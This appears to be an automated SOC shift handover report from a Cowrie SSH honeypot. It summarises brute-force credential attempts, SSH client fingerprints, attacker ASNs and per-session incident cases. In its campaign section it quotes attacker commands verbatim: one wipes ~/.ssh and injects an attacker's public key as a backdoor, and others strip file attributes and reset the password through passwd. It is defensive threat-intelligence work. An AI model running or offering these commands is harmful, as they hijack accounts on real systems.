# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-13 |
| **Generated At** | 2026-08-13T09:17:19Z |
| **Shift Time** | 09:17 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **348** |
| Confirmed Threats | **321** |
| False Positives Filtered | **27** (7.8%) |
| Unique Attacker IPs | **78** |
| Countries of Origin | **25** |
| High Severity Cases | **235** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **113** |
| Malware Samples Analyzed | **2** HIGH · **23** MED · 20 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **254** |
| Unique Credential Pairs | **214** |
| Unique Usernames | **104** |
| Unique Passwords | **146** |
| Successful Auth Pairs | **237** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 64 |
| `admin` | 23 |
| `ubuntu` | 8 |
| `debian` | 8 |
| `nobody` | 8 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 18 |
| `12345678` | 10 |
| `root` | 8 |
| `123` | 7 |
| `123456789` | 6 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `debian` | `12345678` | 6 |
| `root` | `LeitboGi0ro` | 5 |
| `nobody` | `test` | 5 |
| `admin` | `toor` | 4 |
| `config` | `1q2w3e4r` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `default` | `default` | `91.92.42.227` | 2026-08-13T06:55:05 |
| `hadoop` | `123` | `91.92.42.227` | 2026-08-13T06:55:11 |
| `ark` | `ark` | `91.92.42.227` | 2026-08-13T06:55:18 |
| `cloud` | `cloud123!` | `91.92.42.227` | 2026-08-13T06:55:25 |
| `root` | `741852963` | `91.92.42.227` | 2026-08-13T06:55:30 |
| `root` | `admin` | `91.92.42.227` | 2026-08-13T06:55:36 |
| `root` | `qwe123` | `91.92.42.227` | 2026-08-13T06:55:42 |
| `postgres` | `123456` | `91.92.42.227` | 2026-08-13T06:55:49 |
| `pi` | `1` | `91.92.42.227` | 2026-08-13T06:55:56 |
| `operator` | `operator` | `91.92.42.227` | 2026-08-13T06:56:03 |
| `username` | `passwd` | `91.92.42.227` | 2026-08-13T06:56:09 |
| `test` | `abc123` | `91.92.42.227` | 2026-08-13T06:56:15 |
| `root` | `asdfasdf-space` | `91.92.42.227` | 2026-08-13T06:56:22 |
| `splunk` | `password` | `91.92.42.227` | 2026-08-13T06:56:27 |
| `deploy` | `root` | `91.92.42.227` | 2026-08-13T06:56:36 |
| `root` | `123456789` | `91.92.42.227` | 2026-08-13T06:56:41 |
| `root` | `baidu123` | `91.92.42.227` | 2026-08-13T06:56:48 |
| `odoo18` | `odoo` | `91.92.42.227` | 2026-08-13T06:56:56 |
| `minecraft` | `password` | `91.92.42.227` | 2026-08-13T06:57:01 |
| `dmdba` | `dmdba` | `91.92.42.227` | 2026-08-13T06:57:07 |
| `ubuntu` | `qwe123456` | `91.92.42.227` | 2026-08-13T06:57:14 |
| `bot` | `root` | `91.92.42.227` | 2026-08-13T06:57:20 |
| `user10` | `user10` | `91.92.42.227` | 2026-08-13T06:57:27 |
| `username` | `username` | `91.92.42.227` | 2026-08-13T06:57:34 |
| `minecraft` | `minecraft` | `91.92.42.227` | 2026-08-13T06:57:40 |
| `samuel` | `a` | `91.92.42.227` | 2026-08-13T06:57:46 |
| `opc` | `opc` | `91.92.42.227` | 2026-08-13T06:57:53 |
| `runner` | `root` | `91.92.42.227` | 2026-08-13T06:58:00 |
| `sam` | `123456789` | `91.92.42.227` | 2026-08-13T06:58:07 |
| `fivem` | `fivem` | `91.92.42.227` | 2026-08-13T06:58:12 |
| `deploy` | `123123` | `91.92.42.227` | 2026-08-13T06:58:19 |
| `claude` | `123456` | `91.92.42.227` | 2026-08-13T06:58:26 |
| `root1` | `root1` | `91.92.42.227` | 2026-08-13T06:58:32 |
| `t1` | `123` | `91.92.42.227` | 2026-08-13T06:58:38 |
| `ec2-user` | `123456` | `91.92.42.227` | 2026-08-13T06:58:44 |
| `username` | `user` | `91.92.42.227` | 2026-08-13T06:58:50 |
| `work` | `work` | `91.92.42.227` | 2026-08-13T06:58:57 |
| `test` | `test@123` | `91.92.42.227` | 2026-08-13T06:59:04 |
| `root` | `!qaz@WSX` | `91.92.42.227` | 2026-08-13T06:59:10 |
| `admin` | `123123` | `91.92.42.227` | 2026-08-13T06:59:17 |
| `reza` | `reza` | `91.92.42.227` | 2026-08-13T06:59:23 |
| `sam` | `sam` | `91.92.42.227` | 2026-08-13T06:59:30 |
| `root` | `Passw0rd` | `91.92.42.227` | 2026-08-13T06:59:37 |
| `ubuntu` | `123456789` | `91.92.42.227` | 2026-08-13T06:59:44 |
| `jellyfin` | `123` | `91.92.42.227` | 2026-08-13T06:59:50 |
| `root` | `Admin123!` | `91.92.42.227` | 2026-08-13T06:59:56 |
| `ubuntu` | `1234` | `91.92.42.227` | 2026-08-13T07:00:03 |
| `deployer` | `12345678` | `91.92.42.227` | 2026-08-13T07:00:10 |
| `deploy` | `qwerty123` | `91.92.42.227` | 2026-08-13T07:00:16 |
| `root` | `Root@123` | `91.92.42.227` | 2026-08-13T07:00:23 |
| `root` | `changemeNOW` | `91.92.42.227` | 2026-08-13T07:00:29 |
| `root` | `dxfUgwfiNcx8` | `91.92.42.227` | 2026-08-13T07:00:36 |
| `node` | `1qaz2wsx` | `91.92.42.227` | 2026-08-13T07:00:43 |
| `test` | `123` | `91.92.42.227` | 2026-08-13T07:00:49 |
| `test` | `123456789` | `91.92.42.227` | 2026-08-13T07:00:57 |
| `root` | `Aa123456` | `91.92.42.227` | 2026-08-13T07:01:04 |
| `dani` | `dani` | `91.92.42.227` | 2026-08-13T07:01:09 |
| `user3` | `user3` | `91.92.42.227` | 2026-08-13T07:01:16 |
| `gitlab-runner` | `test` | `91.92.42.227` | 2026-08-13T07:01:22 |
| `root` | `QWEqwe123` | `91.92.42.227` | 2026-08-13T07:01:29 |
| `deploy` | `rootroot` | `91.92.42.227` | 2026-08-13T07:01:36 |
| `dev` | `123` | `91.92.42.227` | 2026-08-13T07:01:42 |
| `root` | `P@ssw0rd` | `91.92.42.227` | 2026-08-13T07:01:49 |
| `root` | `LeitboGi0ro` | `91.92.42.227` | 2026-08-13T07:01:56 |
| `avax` | `avax` | `91.92.42.227` | 2026-08-13T07:02:03 |
| `test` | `passwd` | `91.92.42.227` | 2026-08-13T07:02:09 |
| `bob` | `bob` | `91.92.42.227` | 2026-08-13T07:02:16 |
| `vncuser` | `password` | `91.92.42.227` | 2026-08-13T07:02:23 |
| `hamed` | `hamed` | `91.92.42.227` | 2026-08-13T07:02:30 |
| `uftp` | `uftp` | `91.92.42.227` | 2026-08-13T07:02:36 |
| `root` | `nD6ffS9msOngs` | `91.92.42.227` | 2026-08-13T07:02:44 |
| `admin` | `qwerty1` | `175.198.18.3` | 2026-08-13T07:02:44 |
| `root` | `P@ssw0rd2026` | `91.92.42.227` | 2026-08-13T07:02:51 |
| `admin` | `qwerty1` | `34.41.211.48` | 2026-08-13T07:02:55 |
| `tester` | `12345` | `91.92.42.227` | 2026-08-13T07:02:58 |
| `admin` | `qwerty1` | `200.105.141.172` | 2026-08-13T07:03:03 |
| `ubuntu` | `qwe123` | `91.92.42.227` | 2026-08-13T07:03:04 |
| `liyang` | `123456` | `91.92.42.227` | 2026-08-13T07:03:11 |
| `user2` | `1` | `91.92.42.227` | 2026-08-13T07:03:18 |
| `user` | `1qaz@WSX` | `91.92.42.227` | 2026-08-13T07:03:25 |
| `root` | `Aa123456.` | `91.92.42.227` | 2026-08-13T07:03:31 |
| `chenxi` | `123456` | `91.92.42.227` | 2026-08-13T07:03:37 |
| `user` | `1234` | `91.92.42.227` | 2026-08-13T07:03:45 |
| `root` | `P@ssword1` | `91.92.42.227` | 2026-08-13T07:03:51 |
| `vyos` | `vyos` | `91.92.42.227` | 2026-08-13T07:03:58 |
| `gitlab` | `git` | `91.92.42.227` | 2026-08-13T07:04:04 |
| `ftpuser` | `ftpuser` | `91.92.42.227` | 2026-08-13T07:04:11 |
| `jenkins` | `jenkins` | `91.92.42.227` | 2026-08-13T07:04:18 |
| `ts3` | `123` | `91.92.42.227` | 2026-08-13T07:04:24 |
| `ubuntu` | `ubuntu` | `91.92.42.227` | 2026-08-13T07:04:30 |
| `portal` | `portal` | `91.92.42.227` | 2026-08-13T07:04:37 |
| `root` | `baidu@123` | `91.92.42.227` | 2026-08-13T07:04:44 |
| `root` | `aB123456` | `91.92.42.227` | 2026-08-13T07:04:50 |
| `docker` | `docker123` | `91.92.42.227` | 2026-08-13T07:04:58 |
| `root` | `qwertyuiop` | `91.92.42.227` | 2026-08-13T07:05:05 |
| `erp` | `erp` | `91.92.42.227` | 2026-08-13T07:05:11 |
| `user` | `12345678` | `91.92.42.227` | 2026-08-13T07:05:17 |
| `rdpuser` | `123456` | `91.92.42.227` | 2026-08-13T07:05:25 |
| `admin1` | `redhat` | `91.92.42.227` | 2026-08-13T07:05:31 |
| `root` | `abcd@1234` | `91.92.42.227` | 2026-08-13T07:05:38 |
| `ai` | `123456` | `91.92.42.227` | 2026-08-13T07:05:44 |
| `root` | `11` | `91.92.42.227` | 2026-08-13T07:05:50 |
| `pi` | `12345678` | `91.92.42.227` | 2026-08-13T07:05:57 |
| `www` | `12345678` | `91.92.42.227` | 2026-08-13T07:06:03 |
| `appuser` | `appuser` | `91.92.42.227` | 2026-08-13T07:06:10 |
| `user` | `user1234` | `91.92.42.227` | 2026-08-13T07:06:17 |
| `root` | `Pass1234` | `91.92.42.227` | 2026-08-13T07:06:23 |
| `bot` | `111111` | `91.92.42.227` | 2026-08-13T07:06:30 |
| `admin` | `E4IuG88G` | `91.92.42.227` | 2026-08-13T07:06:37 |
| `net` | `net` | `49.206.194.29` | 2026-08-13T07:06:41 |
| `deploy` | `123456789` | `91.92.42.227` | 2026-08-13T07:06:43 |
| `postgres` | `postgres123` | `91.92.42.227` | 2026-08-13T07:06:50 |
| `debian` | `qwerty` | `91.92.42.227` | 2026-08-13T07:06:57 |
| `teamspeak` | `raspberry` | `91.92.42.227` | 2026-08-13T07:07:04 |
| `oscar` | `oscar` | `91.92.42.227` | 2026-08-13T07:07:17 |
| `root` | `qwerty` | `91.92.42.227` | 2026-08-13T07:07:25 |
| `user1` | `123456` | `91.92.42.227` | 2026-08-13T07:07:32 |
| `david` | `123456` | `91.92.42.227` | 2026-08-13T07:07:38 |
| `user` | `qwe123456` | `91.92.42.227` | 2026-08-13T07:07:45 |
| `tactical` | `123456` | `91.92.42.227` | 2026-08-13T07:07:52 |
| `ubnt` | `123456789` | `118.26.153.102` | 2026-08-13T07:07:55 |
| `root` | `abc123456` | `91.92.42.227` | 2026-08-13T07:07:58 |
| `fastuser` | `fastuser` | `91.92.42.227` | 2026-08-13T07:08:06 |
| `root` | `Qwerty123` | `91.92.42.227` | 2026-08-13T07:08:11 |
| `alex` | `alex` | `91.92.42.227` | 2026-08-13T07:08:18 |
| `alex` | `1` | `91.92.42.227` | 2026-08-13T07:08:25 |
| `openclaw` | `12345` | `91.92.42.227` | 2026-08-13T07:08:31 |
| `debian` | `debian` | `91.92.42.227` | 2026-08-13T07:08:37 |
| `admin` | `admin!@` | `91.92.42.227` | 2026-08-13T07:08:44 |
| `ubuntu` | `123456` | `91.92.42.227` | 2026-08-13T07:08:52 |
| `admin` | `P@ssw0rd` | `91.92.42.227` | 2026-08-13T07:08:57 |
| `myuser` | `123456` | `91.92.42.227` | 2026-08-13T07:09:04 |
| `drcomadmin` | `drcomadmin123` | `91.92.42.227` | 2026-08-13T07:09:11 |
| `kingbase` | `kingbase` | `91.92.42.227` | 2026-08-13T07:09:17 |
| `bot` | `bot` | `91.92.42.227` | 2026-08-13T07:09:24 |
| `root` | `qwer1234` | `91.92.42.227` | 2026-08-13T07:09:31 |
| `system` | `1qaz2wsx` | `91.92.42.227` | 2026-08-13T07:09:37 |
| `trader` | `trader` | `91.92.42.227` | 2026-08-13T07:09:44 |
| `private` | `private` | `91.92.42.227` | 2026-08-13T07:09:49 |
| `root` | `12345qwert` | `91.92.42.227` | 2026-08-13T07:09:56 |
| `config` | `config` | `91.92.42.227` | 2026-08-13T07:10:03 |
| `developer` | `dev` | `91.92.42.227` | 2026-08-13T07:10:09 |
| `steam` | `1` | `91.92.42.227` | 2026-08-13T07:10:17 |
| `wizard` | `wizard` | `91.92.42.227` | 2026-08-13T07:10:23 |
| `pi` | `root` | `91.92.42.227` | 2026-08-13T07:10:30 |
| `appuser` | `12345` | `91.92.42.227` | 2026-08-13T07:10:37 |
| `odoo17` | `odoo17` | `91.92.42.227` | 2026-08-13T07:10:45 |
| `minecraft` | `123456` | `91.92.42.227` | 2026-08-13T07:10:52 |
| `btc` | `btc` | `91.92.42.227` | 2026-08-13T07:10:59 |
| `root` | `CatCult2025!` | `91.92.42.227` | 2026-08-13T07:11:05 |
| `claude` | `1` | `91.92.42.227` | 2026-08-13T07:11:11 |
| `root` | `1Q2w3e4r` | `91.92.42.227` | 2026-08-13T07:11:16 |
| `root` | `root@1234` | `91.92.42.227` | 2026-08-13T07:11:22 |
| `root` | `abc123` | `91.92.42.227` | 2026-08-13T07:11:29 |
| `root` | `1qaz@wsx` | `91.92.42.227` | 2026-08-13T07:11:36 |
| `sysupdate` | `Password1` | `91.92.42.227` | 2026-08-13T07:11:44 |
| `root` | `root1234` | `91.92.42.227` | 2026-08-13T07:11:49 |
| `user` | `12345` | `91.92.42.227` | 2026-08-13T07:11:57 |
| `stack` | `stack` | `91.92.42.227` | 2026-08-13T07:12:04 |
| `admin` | `toor` | `123.52.202.92` | 2026-08-13T07:12:06 |
| `admin` | `root` | `91.92.42.227` | 2026-08-13T07:12:11 |
| `guest` | `abc123` | `91.92.42.227` | 2026-08-13T07:12:17 |
| `admin` | `toor` | `178.178.194.192` | 2026-08-13T07:12:19 |
| `root` | `root@123` | `91.92.42.227` | 2026-08-13T07:12:23 |
| `guest` | `guest123` | `91.92.42.227` | 2026-08-13T07:12:30 |
| `root` | `P@ssw0rd123` | `91.92.42.227` | 2026-08-13T07:12:36 |
| `support` | `support` | `10.0.0.73` | 2026-08-13T07:12:38 |
| `ubuntu` | `qwer1234` | `91.92.42.227` | 2026-08-13T07:12:43 |
| `frappe` | `123` | `91.92.42.227` | 2026-08-13T07:12:49 |
| `sysupdate` | `123456` | `91.92.42.227` | 2026-08-13T07:12:56 |
| `root` | `1234` | `91.92.42.227` | 2026-08-13T07:13:02 |
| `root` | `A123456a` | `91.92.42.227` | 2026-08-13T07:13:09 |
| `fivem` | `password` | `91.92.42.227` | 2026-08-13T07:13:15 |
| `root` | `Aa111111.` | `91.92.42.227` | 2026-08-13T07:13:21 |
| `rdpuser` | `rdpuser` | `91.92.42.227` | 2026-08-13T07:13:28 |
| `root` | `Huawei123` | `91.92.42.227` | 2026-08-13T07:13:34 |
| `student` | `123456` | `91.92.42.227` | 2026-08-13T07:13:41 |
| `localhost` | `localhost` | `91.92.42.227` | 2026-08-13T07:13:47 |
| `root` | `p@ssw0rd` | `91.92.42.227` | 2026-08-13T07:13:54 |
| `odoo14` | `odoo14` | `91.92.42.227` | 2026-08-13T07:14:00 |
| `git` | `git` | `91.92.42.227` | 2026-08-13T07:14:06 |
| `dev` | `dev` | `91.92.42.227` | 2026-08-13T07:14:13 |
| `root` | `Aa123321` | `91.92.42.227` | 2026-08-13T07:14:20 |
| `root` | `Aa@123456` | `91.92.42.227` | 2026-08-13T07:14:27 |
| `master` | `master` | `91.92.42.227` | 2026-08-13T07:14:33 |
| `dolphinscheduler` | `dolphinscheduler` | `91.92.42.227` | 2026-08-13T07:14:39 |
| `ftpuser1` | `123456` | `91.92.42.227` | 2026-08-13T07:14:46 |
| `root` | `!QAZ2wsx3edc` | `91.92.42.227` | 2026-08-13T07:14:53 |
| `guest` | `123456` | `91.92.42.227` | 2026-08-13T07:15:00 |
| `packer` | `packer` | `91.92.42.227` | 2026-08-13T07:15:07 |
| `vbox` | `123456` | `91.92.42.227` | 2026-08-13T07:15:12 |
| `testuser` | `testuser` | `91.92.42.227` | 2026-08-13T07:15:21 |
| `config` | `1q2w3e4r` | `10.0.0.73` | 2026-08-13T07:18:22 |
| `admin` | `admin7` | `10.0.0.73` | 2026-08-13T07:24:43 |
| `root` | `ubuntu` | `117.50.218.37` | 2026-08-13T07:29:19 |
| `config` | `1q2w3e4r` | `117.222.53.147` | 2026-08-13T07:37:12 |
| `config` | `1q2w3e4r` | `65.20.133.56` | 2026-08-13T07:37:20 |
| `admin` | `toor` | `103.68.22.115` | 2026-08-13T07:41:10 |
| `admin` | `toor` | `136.56.34.147` | 2026-08-13T07:41:21 |
| `admin` | `admin7` | `74.208.177.56` | 2026-08-13T07:42:27 |
| `admin` | `admin7` | `178.178.194.128` | 2026-08-13T07:42:33 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-08-13T07:46:05 |
| `root` | `123@@@` | `129.153.145.135` | 2026-08-13T07:46:05 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-08-13T07:46:09 |
| `blank` | `12345` | `117.211.15.106` | 2026-08-13T07:46:21 |
| `root` | `LeitboGi0ro` | `165.1.75.106` | 2026-08-13T07:50:43 |
| `root` | `123@@@` | `165.1.75.106` | 2026-08-13T07:50:48 |
| `support` | `support` | `176.53.159.196` | 2026-08-13T07:52:35 |
| `patrol` | `patrol123` | `203.25.208.110` | 2026-08-13T07:54:08 |
| `admin` | `admin` | `10.0.0.73` | 2026-08-13T07:55:48 |
| `admin` | `ucs1122` | `10.0.0.73` | 2026-08-13T07:58:44 |
| `rtorrent` | `rtorrent` | `203.25.208.110` | 2026-08-13T08:04:25 |
| `root` | `qweewq123` | `203.25.208.110` | 2026-08-13T08:07:41 |
| `345gs5662d34` | `345gs5662d34` | `203.25.208.110` | 2026-08-13T08:07:47 |
| `root` | `3245gs5662d34` | `203.25.208.110` | 2026-08-13T08:07:50 |
| `nobody` | `techsupport` | `220.180.249.165` | 2026-08-13T08:11:23 |
| `nobody` | `techsupport` | `45.170.50.2` | 2026-08-13T08:11:33 |
| `nobody` | `techsupport` | `221.182.185.190` | 2026-08-13T08:11:41 |
| `admin` | `ucs1122` | `203.252.10.4` | 2026-08-13T08:16:46 |
| `admin` | `ucs1122` | `122.160.15.31` | 2026-08-13T08:16:55 |
| `special` | `special` | `203.25.208.110` | 2026-08-13T08:16:56 |
| `special` | `3245gs5662d34` | `203.25.208.110` | 2026-08-13T08:17:03 |
| `nobody` | `test` | `114.30.180.58` | 2026-08-13T08:20:48 |
| `ubuntu` | `Passw0rd@1234` | `203.25.208.110` | 2026-08-13T08:26:14 |
| `debian` | `12345678` | `10.0.0.73` | 2026-08-13T08:27:08 |
| `deploy` | `Abcd@1234` | `203.25.208.110` | 2026-08-13T08:29:19 |
| `deploy` | `3245gs5662d34` | `203.25.208.110` | 2026-08-13T08:29:27 |
| `nobody` | `test` | `10.0.0.73` | 2026-08-13T08:32:27 |
| `config` | `maintenance` | `10.0.0.73` | 2026-08-13T08:33:31 |
| `root` | `` | `92.5.66.49` | 2026-08-13T08:39:52 |
| `root` | `admin` | `92.5.66.49` | 2026-08-13T08:43:14 |
| `debian` | `12345678` | `178.178.194.128` | 2026-08-13T08:45:35 |
| `debian` | `12345678` | `34.41.211.48` | 2026-08-13T08:45:41 |
| `debian` | `12345678` | `112.6.127.244` | 2026-08-13T08:45:48 |
| `debian` | `12345678` | `119.152.54.111` | 2026-08-13T08:46:02 |
| `nobody` | `test` | `124.239.129.2` | 2026-08-13T08:49:35 |
| `nobody` | `test` | `176.12.132.63` | 2026-08-13T08:49:47 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **348** |
| Sessions with Fingerprint | **15** |
| Unique HASSH Fingerprints | **15** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 196 |
| OpenSSH | 27 |
| libssh | 23 |
| Paramiko (Python) | 8 |
| Unknown | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `0a07365cc01f...` | Generic scanner | 185 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 27 | 25 |
| `f555226df196...` | Mirai/variant | 15 | 1 |
| `a2de0f306611...` | Mirai/variant | 8 | 2 |
| `4e066189c3bb...` | Generic scanner | 3 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `0a07365cc01f...` | Go SSH scanner | 185 | 1 | Generic scanner |
| `acaa53e0a7d7...` | OpenSSH | 27 | 25 | Mirai/variant |
| `f555226df196...` | libssh | 15 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 8 | 3 | — |
| `a2de0f306611...` | Paramiko (Python) | 8 | 2 | Mirai/variant |
| `4e066189c3bb...` | Go SSH scanner | 3 | 1 | Generic scanner |
| `16443846184e...` | Go SSH scanner | 3 | 1 | Generic scanner |
| `5bd26477da54...` | PuTTY | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **6** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo -e "rtorrent\nygYSCVpeqBuT\nygYSCVpeqBuT"|passwd|bash
```
```
Enter new UNIX password:
```
Source IPs: `203.25.208.110`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `203.25.208.110`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **78** |
| Unique ASNs | **58** |
| High-Risk ASNs | **48** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS46562` | Performive LLC | 5 | MEDIUM |
| `AS4134` | CHINANET BACKBONE | 4 | HIGH |
| `AS63949` | Akamai Connected Cloud | 3 | HIGH |
| `AS48721` | Flyservers S.A. | 3 | HIGH |
| `AS31898` | Oracle Corporation | 3 | HIGH |
| `AS25159` | PJSC MegaFon | 2 | HIGH |
| `AS7303` | Telecom Argentina S.A. | 2 | LOW |
| `AS27747` | Telecentro S.A. | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (234)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-59abf0941098

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 06:55 |
| **Last Seen** | 2026-08-13 06:55 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 06:55:03` | `cowrie.session.connect` |
| `2026-08-13 06:55:03` | `cowrie.client.version` |
| `2026-08-13 06:55:03` | `cowrie.client.kex` |
| `2026-08-13 06:55:05` | `cowrie.login.success` |
| `2026-08-13 06:55:06` | `cowrie.session.params` |
| `2026-08-13 06:55:06` | `cowrie.command.input` |
| `2026-08-13 06:55:06` | `cowrie.log.closed` |
| `2026-08-13 06:55:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-901adb063898

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 06:55 |
| **Last Seen** | 2026-08-13 06:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 06:55:10` | `cowrie.session.connect` |
| `2026-08-13 06:55:10` | `cowrie.client.version` |
| `2026-08-13 06:55:10` | `cowrie.client.kex` |
| `2026-08-13 06:55:11` | `cowrie.login.success` |
| `2026-08-13 06:55:12` | `cowrie.session.params` |
| `2026-08-13 06:55:12` | `cowrie.command.input` |
| `2026-08-13 06:55:12` | `cowrie.log.closed` |
| `2026-08-13 06:55:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10b14500cb02

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 06:55 |
| **Last Seen** | 2026-08-13 06:55 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 06:55:16` | `cowrie.session.connect` |
| `2026-08-13 06:55:16` | `cowrie.client.version` |
| `2026-08-13 06:55:16` | `cowrie.client.kex` |
| `2026-08-13 06:55:18` | `cowrie.login.success` |
| `2026-08-13 06:55:19` | `cowrie.session.params` |
| `2026-08-13 06:55:19` | `cowrie.command.input` |
| `2026-08-13 06:55:19` | `cowrie.log.closed` |
| `2026-08-13 06:55:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79573a4a08fd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 06:55 |
| **Last Seen** | 2026-08-13 06:55 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 06:55:23` | `cowrie.session.connect` |
| `2026-08-13 06:55:23` | `cowrie.client.version` |
| `2026-08-13 06:55:23` | `cowrie.client.kex` |
| `2026-08-13 06:55:25` | `cowrie.login.success` |
| `2026-08-13 06:55:26` | `cowrie.session.params` |
| `2026-08-13 06:55:26` | `cowrie.command.input` |
| `2026-08-13 06:55:26` | `cowrie.log.closed` |
| `2026-08-13 06:55:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26598dae710b

| Field | Detail |
|---|---|
